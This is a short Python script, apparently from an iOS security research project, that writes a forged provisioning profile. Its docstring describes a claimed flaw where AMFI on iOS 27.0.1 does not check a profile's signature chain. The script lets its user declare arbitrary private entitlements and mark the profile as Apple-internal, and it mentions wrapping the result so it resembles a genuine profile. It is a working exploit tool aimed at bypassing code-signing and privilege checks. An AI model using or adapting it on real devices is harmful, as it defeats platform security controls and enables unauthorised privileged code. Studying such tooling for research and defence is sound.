#!/usr/bin/env python3
"""
make_profile.py — craft the `embedded.mobileprovision` the probe carries.

The static analysis of the AMFI kext on iOS 27.0.1 showed that the kernel
never verifies a provisioning profile's own CMS chain: the profile is DER/plist
parsed and only a handful of dictionary keys are inspected
(`Entitlements`, `UUID`, `AppleInternalProfile`, `DeveloperCertificates`,
`ProvisionedDevices`).  The profile itself is handed to the kernel by `amfid`.

This script builds such a profile.  It writes a plain plist; `resign.sh`
optionally wraps it in a real CMS container with the developer's own identity
so that the file has the same *shape* as a genuine mobileprovision.

    ./scripts/make_profile.py --out profile.plist \
        --entitlement com.apple.private.mobileinstall.allowedSPI \
        --apple-internal
"""

import argparse
import datetime
import plistlib
import uuid
import sys


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", required=True)
    ap.add_argument("--entitlement", action="append", default=[],
                    help="entitlement key to declare (repeatable)")
    ap.add_argument("--team-id", default="")
    ap.add_argument("--bundle-id", default="com.research.ios27.privprobe")
    ap.add_argument("--apple-internal", action="store_true",
                    help="set AppleInternalProfile = true")
    ap.add_argument("--uuid", default="")
    ap.add_argument("--days", type=int, default=365)
    args = ap.parse_args()

    now = datetime.datetime.now(datetime.timezone.utc)
    profile = {
        "AppIDName": "Probe",
        "ApplicationIdentifierPrefix": [args.team_id] if args.team_id else [],
        "CreationDate": now,
        "Platform": ["iOS"],
        "DeveloperCertificates": [],
        "Entitlements": {k: True for k in args.entitlement},
        "ExpirationDate": now + datetime.timedelta(days=args.days),
        "Name": "Probe Profile",
        "TeamIdentifier": [args.team_id] if args.team_id else [],
        "TeamName": "",
        "TimeToLive": args.days,
        "UUID": args.uuid or str(uuid.uuid4()).upper(),
        "Version": 1,
        "ProvisionedDevices": [],
    }
    if args.apple_internal:
        profile["AppleInternalProfile"] = True

    with open(args.out, "wb") as f:
        plistlib.dump(profile, f, fmt=plistlib.FMT_XML)

    print(f"wrote {args.out}")
    print(f"  entitlements : {sorted(profile['Entitlements'])}")
    print(f"  apple-internal: {args.apple_internal}")
    print(f"  uuid         : {profile['UUID']}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
